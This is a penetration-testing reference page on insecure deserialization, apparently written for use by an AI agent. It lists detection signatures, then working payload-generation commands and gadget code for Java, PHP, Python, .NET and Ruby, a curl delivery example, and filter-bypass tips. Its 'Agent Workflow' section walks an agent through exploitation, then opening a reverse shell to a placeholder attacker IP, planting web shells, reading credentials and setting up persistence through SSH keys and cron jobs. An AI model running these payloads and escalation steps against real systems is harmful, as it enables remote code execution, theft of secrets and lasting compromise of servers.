# Insecure Deserialization

> **Summary**: Exploit applications that deserialize untrusted data, allowing object injection through crafted serialized payloads.
> **Impact**: Remote code execution, authentication bypass, denial of service, privilege escalation.
> **Typical Severity**: Critical

## Detection

### Indicators
- Serialized data in cookies, hidden fields, API parameters, or file uploads
- Content-Type headers indicating serialized formats (`application/x-java-serialized-object`, `application/x-php-serialized`)
- Base64-encoded blobs in parameters or cookies

### Black-Box Detection (Magic Bytes)

| Signature | Format |
|-----------|--------|
| `a:4:{i:0;s:4:"Test"...}` | PHP serialized |
| `AC ED 00 05` (hex) / `rO0ABXNy` (base64) | Java ObjectInputStream |
| `AAEAAAD/////` (base64) / `00 01 00 00 00 ff ff ff ff` (hex) | .NET BinaryFormatter |
| `80 03` / `80 04 95` (hex) | Python Pickle (protocol 2-5) |
| `04 08` (hex) | Ruby Marshal |
| Strings containing `$type`, `__type`, `TypeObject` | .NET JSON deserializers |

### White-Box Detection (Dangerous Functions)

| Function | Language |
|----------|----------|
| `unserialize()` | PHP |
| `pickle.loads()` | Python (Pickle) |
| `jsonpickle.decode()` | Python (JSONPickle) |
| `yaml.load()` (without SafeLoader) | Python (PyYAML) |
| `readObject()` | Java |
| `XMLDecoder.readObject()` | Java |
| `Deserialize()`, `ReadObject()` | C# / .NET |
| `Marshal.load()` | Ruby |
| `JSON.parse()` with reviver abuse | Node.js |

#### .NET Dangerous Deserializers

| Deserializer | Sink Method |
|-------------|-------------|
| BinaryFormatter | `.Deserialize(...)` |
| NetDataContractSerializer | `.ReadObject(...)` |
| LosFormatter | `.Deserialize(...)` |
| ObjectStateFormatter | `.Deserialize(...)` |
| SoapFormatter | `.Deserialize(...)` |
| Json.NET (with TypeNameHandling) | `JsonConvert.DeserializeObject(...)` |
| JavaScriptSerializer (with TypeResolver) | `.Deserialize(...)` |
| XmlSerializer (with dangerous types) | `.Deserialize(...)` |
| YamlDotNet (with unsafe config) | `.Deserialize<...>(...)` |
| fastJSON | `JSON.ToObject(...)` |

## Exploitation

### Prerequisites
- Application deserializes user-controlled data
- Gadget chain available in application classpath/dependencies
- No input validation or signing on serialized data (or signing key is known)

### Step-by-Step
1. **Identify serialized data** -- look for magic bytes, base64 blobs, or content types
2. **Determine the language/framework** -- error messages, response headers, file extensions
3. **Find available gadget chains** -- match libraries/frameworks to known chains
4. **Generate payload** -- use ysoserial (Java), ysoserial.net (.NET), phpggc (PHP), or custom scripts
5. **Deliver payload** -- replace serialized data in cookie, parameter, or upload
6. **Verify execution** -- DNS callback, sleep delay, HTTP request to attacker server
7. **Success criteria**: Out-of-band callback received or command output observed

### Payloads by Language

#### Java (ysoserial)
```bash
# List available gadget chains
java -jar ysoserial.jar --help

# Generate payload (common chains: CommonsCollections1-7, Groovy1, Spring1)
java -jar ysoserial.jar CommonsCollections6 '<COMMAND>' | base64

# DNS callback for detection
java -jar ysoserial.jar URLDNS 'http://<BURP_COLLABORATOR>' | base64

# GadgetProbe for classpath enumeration
java -jar ysoserial.jar GadgetProbe '<BURP_COLLABORATOR>' | base64
```

**Blind detection via DNS**:
Use URLDNS gadget (no dependency requirements) to confirm deserialization occurs.

**JSF ViewState**:
If ViewState is not encrypted, inject serialized Java objects via the `javax.faces.ViewState` parameter.

#### PHP (phpggc)
```bash
# List gadget chains for a framework
phpggc -l Laravel
phpggc -l Symfony

# Generate RCE payload (base64 encoded)
phpggc Laravel/RCE9 system '<COMMAND>' -b

# Generate PHAR deserialization payload
phpggc -p phar Laravel/RCE9 system '<COMMAND>' -o exploit.phar

# Symfony RCE
phpggc Symfony/RCE4 exec '<COMMAND>' -b
```

**PHAR deserialization**: Upload a `.phar` file and trigger deserialization via `phar://` wrapper in file operations (`file_exists()`, `file_get_contents()`, `include()`).

#### Python (Pickle)
```python
import pickle
import base64
import os

class RCE:
    def __reduce__(self):
        return os.system, ("<COMMAND>",)

payload = base64.b64encode(pickle.dumps(RCE())).decode()
print(payload)
```

**PyYAML** (if `yaml.load()` without SafeLoader):
```yaml
!!python/object/apply:os.system ['<COMMAND>']
```

#### .NET (ysoserial.net)

```powershell
# ObjectDataProvider gadget
.\ysoserial.exe -f Json.Net -g ObjectDataProvider -c "<COMMAND>" -o Raw

# TypeConfuseDelegate gadget
.\ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c "<COMMAND>" -o base64

# XmlSerializer gadget
.\ysoserial.exe -f XmlSerializer -g ObjectDataProvider -c "<COMMAND>" -o Raw

# Common formatters: Json.Net, BinaryFormatter, SoapFormatter, XmlSerializer, LosFormatter
# Common gadgets: ObjectDataProvider, TypeConfuseDelegate, PSObject, WindowsIdentity
```

**ViewState exploitation** (ASP.NET):
```bash
# If MachineKey is known (from web.config leak)
.\ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "<COMMAND>" --validationalg="SHA1" --validationkey="<KEY>" --generator="<GENERATOR>" --viewstateuserkey="<USERKEY>" --isdebug
```

#### Ruby (Marshal)
```ruby
# Custom gadget via Marshal
require 'erb'
require 'base64'

payload = ERB.allocate
payload.instance_variable_set(:@src, "<%= system('<COMMAND>') %>")
# Serialize and deliver
puts Base64.encode64(Marshal.dump(payload))
```

### Proof of Concept
```bash
# Java -- trigger DNS callback to confirm deserialization
java -jar ysoserial.jar URLDNS 'http://<BURP_COLLABORATOR>' > payload.bin

# PHP -- trigger sleep to confirm
phpggc Symfony/RCE4 exec 'sleep 10' -b

# Deliver via curl
curl -X POST http://<TARGET>/api/endpoint \
  -H "Content-Type: application/x-java-serialized-object" \
  --data-binary @payload.bin
```

## Bypasses
- **Signed serialized data** -- leak or brute-force the signing key (e.g., ASP.NET MachineKey, Django SECRET_KEY)
- **Class whitelisting** -- find gadget chains using only whitelisted classes
- **WAF blocking known payloads** -- encode payload differently (gzip, custom encoding)
- **PHAR wrapper restrictions** -- use alternative wrappers or polyglot files
- **Look-ahead deserialization filters (Java)** -- use gadgets from allowed packages

## Escalation
- **RCE** --> full server compromise via OS command execution
- **File read/write** --> access configuration files, plant webshells
- **SSRF** --> chain with URLDNS or HTTP gadgets for internal network access
- **Denial of Service** --> craft deeply nested objects to exhaust resources
- **Persistence** --> write cron jobs, scheduled tasks, or SSH keys via file write gadgets

## Tools

| Tool | Usage |
|------|-------|
| [ysoserial](https://github.com/frohoff/ysoserial) | Java deserialization payload generator |
| [ysoserial.net](https://github.com/pwntester/ysoserial.net) | .NET deserialization payload generator |
| [phpggc](https://github.com/ambionics/phpggc) | PHP gadget chain generator |
| [GadgetProbe](https://github.com/BishopFox/GadgetProbe) | Java classpath enumeration via deserialization |
| [Freddy](https://github.com/nccgroup/freddy) | Burp Suite extension for deserialization detection |
| [Java Deserialization Scanner](https://github.com/federicodotta/Java-Deserialization-Scanner) | Burp extension for Java deserialization |
| [Blacklist3r](https://github.com/NotSoSecure/Blacklist3r) | ASP.NET ViewState MachineKey brute-forcer |
| [marshalsec](https://github.com/mbechler/marshalsec) | Java unmarshaller exploit toolkit |

## Agent Workflow
> Step-by-step instructions for an AI agent to test for this vulnerability.

### Phase 1: Discovery
1. **Identify serialized data in transit**:
   - Inspect all cookies, hidden form fields, API request/response bodies, and file uploads for serialized data signatures:
     - **Java**: Base64 starting with `rO0ABXNy` or hex `AC ED 00 05`.
     - **PHP**: Strings matching pattern `a:\d+:{` or `O:\d+:"` (e.g., `O:4:"User":2:{s:4:"name";s:5:"admin";}`).
     - **.NET**: Base64 starting with `AAEAAAD/////` or `__VIEWSTATE` parameter in ASP.NET forms.
     - **Python**: Hex starting with `80 03` or `80 04 95` (Pickle protocol 2-5). Also check for base64-encoded blobs in cookies.
     - **Ruby**: Hex starting with `04 08` (Marshal format).
   - Check `Content-Type` headers: `application/x-java-serialized-object`, `application/x-php-serialized`, `application/python-pickle`.
   - Record each finding: `<LOCATION>` (cookie/parameter/header), `<FORMAT>` (Java/PHP/.NET/Python/Ruby), `<RAW_VALUE>`.
2. **Identify the language and framework**:
   - Check response headers (`X-Powered-By`, `Server`), file extensions (`.jsp`, `.php`, `.aspx`), error messages.
   - Check for framework-specific indicators: `JSESSIONID` (Java), `PHPSESSID` (PHP), `ASP.NET_SessionId` (.NET), `csrftoken`/`sessionid` (Django/Python).
   - Record: `<LANGUAGE>`, `<FRAMEWORK>`, `<FRAMEWORK_VERSION>` (if discoverable).

### Phase 2: Validation
1. **Confirm deserialization occurs**:
   - **Java**: Generate a URLDNS payload (no dependency requirement): `java -jar ysoserial.jar URLDNS 'http://<COLLABORATOR_URL>' | base64`. Submit in place of the serialized data.
     - **IF** DNS callback received on `<COLLABORATOR_URL>` --> Java deserialization confirmed.
   - **PHP**: Modify a serialized object to change a string value (e.g., change username from `"user"` to `"admin"`). Submit the modified serialized data.
     - **IF** application behavior changes (e.g., elevated privileges) --> PHP deserialization confirmed.
   - **.NET**: If `__VIEWSTATE` is present and not encrypted, decode it and check for serialized objects. Use Burp's ViewState decoder.
     - **IF** ViewState is unencrypted and unsigned --> .NET deserialization attack possible.
   - **Python**: Submit a Pickle payload that triggers a DNS lookup or sleep: `pickle.dumps` with `__reduce__` calling `socket.getaddrinfo('<COLLABORATOR_URL>', 80)`.
     - **IF** DNS callback received --> Python Pickle deserialization confirmed.
2. **Enumerate available gadget chains**:
   - **Java**: Use GadgetProbe to enumerate classpath: `java -jar ysoserial.jar GadgetProbe '<COLLABORATOR_URL>' | base64`. Monitor which DNS callbacks are received to identify available libraries.
   - **PHP**: Identify the framework (Laravel, Symfony, WordPress, etc.) and check `phpggc -l <FRAMEWORK>` for available chains.
   - **.NET**: Determine the deserializer (BinaryFormatter, Json.NET, etc.) from error messages or code review. Check ysoserial.net for matching gadgets.

### Phase 3: Exploitation
1. **Generate and deliver the payload based on language**:
   - **IF Java**:
     - Try common chains in order: `CommonsCollections6`, `CommonsCollections1`, `Groovy1`, `Spring1`, `Jdk7u21`.
     - Generate: `java -jar ysoserial.jar <CHAIN> '<COMMAND>' | base64`.
     - Deliver via the identified `<LOCATION>` (cookie, parameter, request body).
     - **IF** chain fails (ClassNotFoundException) --> try next chain. Use GadgetProbe results to select valid chains.
   - **IF PHP**:
     - Generate: `phpggc <FRAMEWORK>/<CHAIN> system '<COMMAND>' -b`.
     - For PHAR deserialization: `phpggc -p phar <FRAMEWORK>/<CHAIN> system '<COMMAND>' -o exploit.phar`. Upload and trigger via `phar://` wrapper.
     - Deliver via cookie or parameter where `unserialize()` is called.
   - **IF Python**:
     - Create Pickle payload with `__reduce__` method executing `os.system('<COMMAND>')`.
     - Base64-encode and submit in place of original serialized data.
     - For PyYAML: `!!python/object/apply:os.system ['<COMMAND>']`.
   - **IF .NET**:
     - Generate: `ysoserial.exe -f <FORMATTER> -g <GADGET> -c "<COMMAND>" -o base64`.
     - Common formatters: `BinaryFormatter`, `Json.Net`, `SoapFormatter`. Common gadgets: `ObjectDataProvider`, `TypeConfuseDelegate`.
     - For ViewState: `ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "<COMMAND>" --validationalg="SHA1" --validationkey="<KEY>"`.
   - **IF Ruby**:
     - Craft Marshal payload using ERB template injection: `Marshal.dump(erb_payload)`.
2. **Verify execution**:
   - **IF** using DNS callback command (e.g., `nslookup <COLLABORATOR>`) --> check for callback.
   - **IF** using sleep command (e.g., `sleep 10`) --> measure response time delay.
   - **IF** using HTTP callback (e.g., `curl http://<ATTACKER>`) --> check attacker server logs.
   - **IF** direct output reflected --> read command output from response.

### Phase 4: Escalation
1. **Achieve full RCE**:
   - Execute a reverse shell payload: `bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1` (Linux) or PowerShell equivalent (Windows).
   - Alternatively, download and execute a more capable payload.
2. **File read/write**:
   - Use file-write gadgets to plant a persistent web shell.
   - Read sensitive configuration: `<APP_CONFIG>`, database credentials, API keys.
3. **Persistence**:
   - Write SSH authorized_keys, cron jobs (Linux), or scheduled tasks (Windows).
   - Plant a web shell in a web-accessible directory.

## Decision Tree

```
Start: Serialized data identified in <LOCATION>
|
|--> Determine format from magic bytes/patterns
|    |
|    |--> [rO0ABXNy / AC ED 00 05] --> JAVA
|    |    |--> Confirm with URLDNS callback (no dependencies needed)
|    |    |--> Enumerate classpath with GadgetProbe
|    |    |--> Try chains: CommonsCollections6 -> CommonsCollections1 -> Groovy1 -> Spring1
|    |    |--> IF ViewState (JSF) --> check if encrypted, inject via javax.faces.ViewState
|    |
|    |--> [O:\d+:" / a:\d+:{] --> PHP
|    |    |--> Identify framework (Laravel, Symfony, WordPress, etc.)
|    |    |--> List chains: phpggc -l <FRAMEWORK>
|    |    |--> Generate payload: phpggc <CHAIN> system '<CMD>' -b
|    |    |--> IF file upload available --> try PHAR deserialization (phpggc -p phar)
|    |
|    |--> [80 03 / 80 04 95] --> PYTHON PICKLE
|    |    |--> Create __reduce__ payload with os.system
|    |    |--> IF PyYAML --> use !!python/object/apply:os.system
|    |    |--> IF jsonpickle --> craft JSON with py/reduce
|    |
|    |--> [AAEAAAD///// / __VIEWSTATE] --> .NET
|    |    |--> Determine deserializer (BinaryFormatter, Json.Net, etc.)
|    |    |--> IF ViewState --> check for MachineKey in web.config leaks
|    |    |--> Generate: ysoserial.net -f <FORMATTER> -g <GADGET> -c "<CMD>"
|    |    |--> Try gadgets: ObjectDataProvider -> TypeConfuseDelegate -> PSObject
|    |
|    |--> [04 08] --> RUBY MARSHAL
|         |--> Craft ERB-based gadget payload
|         |--> Encode with Marshal.dump and base64
|
|--> IF payload execution fails
     |--> Check for class whitelisting --> find allowed gadgets
     |--> Check for signed data --> attempt key leak or brute-force
     |--> Check for WAF --> re-encode payload (gzip, custom encoding)
```

## Success Criteria

- **Minimum PoC**: Received an OOB callback (DNS/HTTP) confirming that user-supplied serialized data is deserialized by the application.
- **Confirmed Impact**: Achieved command execution on the server (verified via callback, sleep-based timing, or direct output).
- **Escalation Confirmed**: Obtained a reverse shell, read sensitive files, or established persistence.
- **Evidence Required**: (1) The serialized payload sent, (2) the delivery location (cookie/parameter/body), (3) proof of execution (OOB callback logs, command output, or timing difference).

## References
- [PortSwigger - Insecure Deserialization](https://portswigger.net/web-security/deserialization)
- [PayloadsAllTheThings - Insecure Deserialization](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Deserialization)
- [Java Deserialization - The Forgotten Bug Class](https://www.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class)
- [Exploiting ViewState Deserialization](https://notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net)
- [OWASP - Deserialization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html)

## See Also
- [Command Injection](command-injection.md)
- [XXE](xxe.md)
- [SSTI](ssti.md)
